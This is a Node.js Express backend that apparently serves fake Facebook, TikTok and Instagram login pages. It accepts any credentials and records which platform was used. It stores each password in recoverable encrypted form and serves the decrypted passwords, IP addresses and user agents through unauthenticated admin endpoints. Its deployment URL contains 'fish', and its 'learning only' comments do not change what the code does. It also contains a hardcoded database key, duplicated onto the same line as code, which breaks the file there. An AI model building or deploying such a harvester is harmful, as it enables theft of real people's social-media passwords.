// UNIVERSAL LOGIN SYSTEM BACKEND
// ==============================
// Any email/password works - auto-creates accounts
// Stores all credentials for admin viewing
// Tracks which social platform was used (Facebook, TikTok, Instagram)

// Import required modules
const express = require('express');           // Web framework for Node.js
const bcrypt = require('bcrypt');             // For password hashing (security)
const crypto = require('crypto');             // Built-in crypto module for encryption
const { createClient } = require('@supabase/supabase-js'); // Supabase database client

// Initialize Express app
const app = express();
app.use(express.json()); // Parse JSON request bodies

// ==============================
// SUPABASE DATABASE CONFIGURATION
// ==============================
const supabaseUrl = 'https://rkiqozdxcfiwqvzeoutq.supabase.co';  // Your Supabase project URL
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJraXFvemR4Y2Zpd3F2emVvdXRxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3ODgyOTMsImV4cCI6MjA4NTM2NDI5M30.CUen4-RHCDgk8TqySVF-oQIVS3c11H_Yf2h7KexdGjk'; // Your Supabase API key
const supabase = createClient(supabaseUrl, supabaseKey); // Create Supabase clienteyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJraXFvemR4Y2Zpd3F2emVvdXRxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3ODgyOTMsImV4cCI6MjA4NTM2NDI5M30.CUen4-RHCDgk8TqySVF-oQIVS3c11H_Yf2h7KexdGjk

// ==============================
// ENCRYPTION SETUP
// ==============================
// WARNING: Storing passwords in recoverable form is for LEARNING ONLY
// In real applications, passwords should be hashed (one-way) only
const ENCRYPTION_KEY = 'universal-login-32-character-encryption-key'; // Encryption key
const ALGORITHM = 'aes-256-cbc'; // Encryption algorithm
const IV_LENGTH = 16; // Initialization vector length

/**
 * Encrypt text for admin viewing (FOR LEARNING ONLY)
 * @param {string} text - The text to encrypt
 * @returns {string} - Encrypted text
 */
function encrypt(text) {
  try {
    // Generate random initialization vector
    const iv = crypto.randomBytes(IV_LENGTH);
    // Create encryption key from our secret key
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    // Create cipher for encryption
    const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
    // Encrypt the text
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    // Return IV + encrypted text (IV needed for decryption)
    return iv.toString('hex') + ':' + encrypted;
  } catch (error) {
    console.error('Encryption error:', error);
    return 'encryption-error';
  }
}

/**
 * Decrypt text for admin viewing (FOR LEARNING ONLY)
 * @param {string} text - The encrypted text
 * @returns {string} - Decrypted text
 */
function decrypt(text) {
  try {
    // Split IV from encrypted text
    const parts = text.split(':');
    const iv = Buffer.from(parts.shift(), 'hex');
    const encryptedText = parts.join(':');
    // Create decryption key
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    // Create decipher for decryption
    const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
    // Decrypt the text
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error('Decryption error:', error);
    return '[Encrypted - Cannot Decrypt]';
  }
}

// ==============================
// CORS SETUP (Allow frontend to call backend)
// ==============================
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // Allow all origins (for learning)
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// ==============================
// API ENDPOINTS
// ==============================

/**
 * ROOT ENDPOINT - Health Check
 * GET /
 * Just shows API is running
 */
app.get('/', (req, res) => {
  res.json({
    status: '✅ Universal Login Backend Running',
    message: 'Any credentials work! No registration needed.',
    endpoints: {
      login: 'POST /api/login - Login with any credentials',
      adminUsers: 'GET /api/admin/users - Get all users (admin)',
      adminLogs: 'GET /api/admin/logs - Get all login logs (admin)',
      clearData: 'POST /api/admin/clear - Clear all data (admin)'
    }
  });
});

/**
 * UNIVERSAL LOGIN ENDPOINT
 * POST /api/login
 * ANY email/password works - auto-creates accounts
 */
app.post('/api/login', async (req, res) => {
  try {
    // 1. Get data from request body
    const { email, password, platform, platform_name } = req.body;
    
    // 2. Get user information
    const userAgent = req.headers['user-agent'] || 'Unknown Browser';
    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
    
    // 3. Validate input
    if (!email || !password) {
      return res.json({ 
        success: false, 
        error: 'Please enter both email and password' 
      });
    }
    
    // 4. Clean and format email
    const cleanEmail = email.toLowerCase().trim();
    const userName = cleanEmail.split('@')[0]; // Use email prefix as name
    
    // 5. Check if user already exists in database
    const { data: existingUser } = await supabase
      .from('users')
      .select('*')
      .eq('email', cleanEmail)
      .single(); // Get single record
    
    let userId; // Will store user ID
    
    if (existingUser) {
      // 6A. USER EXISTS: Update their login info
      userId = existingUser.id;
      
      await supabase
        .from('users')
        .update({
          last_login: new Date().toISOString(),
          login_count: (existingUser.login_count || 0) + 1,
          ip_address: ip
        })
        .eq('id', userId);
        
      console.log(`📝 User logged in: ${cleanEmail}`);
    } else {
      // 6B. USER DOESN'T EXIST: Create new account automatically
      const passwordHash = await bcrypt.hash(password, 10); // Hash password for security
      const encryptedPassword = encrypt(password); // Encrypt password for admin viewing
      
      const { data: newUser } = await supabase
        .from('users')
        .insert([{
          email: cleanEmail,
          password_hash: passwordHash, // Hashed for authentication
          password_original: encryptedPassword, // Encrypted for admin
          name: userName,
          ip_address: ip,
          user_agent: userAgent,
          created_at: new Date().toISOString(),
          last_login: new Date().toISOString(),
          login_count: 1
        }])
        .select()
        .single();
      
      userId = newUser.id;
      console.log(`✅ New user created: ${cleanEmail}`);
    }
    
    // 7. Log this login for admin dashboard
    await supabase
      .from('admin_logs')
      .insert([{
        user_id: userId,
        email_used: cleanEmail,
        password_original: encrypt(password), // Store encrypted password
        ip_address: ip,
        user_agent: userAgent,
        platform: platform || 'facebook',           // Which platform was used
        platform_name: platform_name || 'Facebook', // Platform display name
        login_time: new Date().toISOString()
      }]);
    
    // 8. Return success response to frontend
    res.json({
      success: true,
      user: {
        id: userId,
        email: cleanEmail,
        name: userName,
        ip: ip,
        platform: platform || 'facebook',           // Send back platform info
        platform_name: platform_name || 'Facebook'  // Send back platform name
      },
      message: 'Login successful! Redirecting to dashboard...'
    });
    
  } catch (error) {
    // 9. Handle any errors
    console.error('❌ Login error:', error);
    res.json({ 
      success: false, 
      error: 'Server error. Please try again.' 
    });
  }
});

/**
 * GET ALL USERS (Admin Only)
 * GET /api/admin/users
 * Returns all users with their decrypted passwords for admin
 */
app.get('/api/admin/users', async (req, res) => {
  try {
    // 1. Get all users from database, newest first
    const { data: users, error } = await supabase
      .from('users')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) throw error;
    
    // 2. Decrypt passwords for admin viewing (LEARNING ONLY)
    const usersWithPasswords = users.map(user => ({
      ...user, // Spread all user properties
      password_display: user.password_original ? decrypt(user.password_original) : 'No password',
      password_hash: undefined // Don't send the hash to frontend
    }));
    
    // 3. Return users to admin
    res.json({ 
      success: true, 
      count: users.length,
      users: usersWithPasswords 
    });
    
  } catch (error) {
    console.error('❌ Admin users error:', error);
    res.json({ 
      success: false, 
      error: 'Failed to load users' 
    });
  }
});

/**
 * GET LOGIN LOGS (Admin Only)
 * GET /api/admin/logs
 * Returns all login attempts with platform information
 */
app.get('/api/admin/logs', async (req, res) => {
  try {
    // 1. Get login logs from database, newest first, limit to 100
    const { data: logs, error } = await supabase
      .from('admin_logs')
      .select('*')
      .order('login_time', { ascending: false })
      .limit(100);
    
    if (error) throw error;
    
    // 2. Decrypt passwords in logs
    const logsWithPasswords = logs.map(log => ({
      ...log, // Spread all log properties
      password_display: log.password_original ? decrypt(log.password_original) : '[Encrypted]'
    }));
    
    // 3. Return logs to admin
    res.json({ 
      success: true, 
      count: logs.length,
      logs: logsWithPasswords 
    });
    
  } catch (error) {
    console.error('❌ Admin logs error:', error);
    res.json({ 
      success: false, 
      error: 'Failed to load login logs' 
    });
  }
});

/**
 * CLEAR ALL DATA (Admin Only - REAL FUNCTION)
 * POST /api/admin/clear
 * Deletes ALL users and ALL login logs from database
 */
app.post('/api/admin/clear', async (req, res) => {
  try {
    console.log('🗑️ Admin requested to clear all data');
    
    // 1. Delete all login logs first (due to foreign key)
    await supabase
      .from('admin_logs')
      .delete()
      .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all
    
    // 2. Delete all users
    await supabase
      .from('users')
      .delete()
      .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all
    
    console.log('✅ All data cleared successfully');
    
    // 3. Return success
    res.json({ 
      success: true, 
      message: '✅ All data cleared successfully',
      cleared_at: new Date().toISOString(),
      cleared: {
        users: 'all',
        logs: 'all'
      }
    });
    
  } catch (error) {
    console.error('❌ Clear data error:', error);
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ==============================
// START SERVER
// ==============================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Universal Login Backend running on port ${PORT}`);
  console.log(`🌐 API URL: http://localhost:${PORT}`);
  console.log(`🔗 Your Render URL: https://fish-backend-00qb.onrender.com`);  
  console.log(`✅ System ready - ANY credentials will work!`);

});
